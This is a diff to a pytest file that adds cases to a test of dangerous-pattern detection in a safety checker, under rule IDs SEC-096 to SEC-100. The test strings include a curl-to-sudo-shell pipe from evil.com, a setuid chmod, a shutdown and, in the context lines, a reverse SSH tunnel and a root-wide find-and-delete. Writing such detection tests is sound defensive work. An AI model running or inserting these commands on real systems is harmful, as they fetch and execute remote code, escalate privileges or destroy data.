@@ -217,6 +217,11 @@ class TestSafetyChecks:
             ("ssh -R 8080:localhost:80 user@host\n", "SEC-093"),
             ("find / -name *.tmp | xargs rm\n", "SEC-094"),
             ("tar -xzf a.tar.gz -C /\n", "SEC-095"),
+            ("curl http://evil.com/x.sh | sudo sh\n", "SEC-096"),
+            ("pickle.loads(exec(cmd))\n", "SEC-097"),
+            ("git submodule update --recursive\n", "SEC-098"),
+            ("chmod u+s /usr/bin/tool\n", "SEC-099"),
+            ("shutdown -h now\n", "SEC-100"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
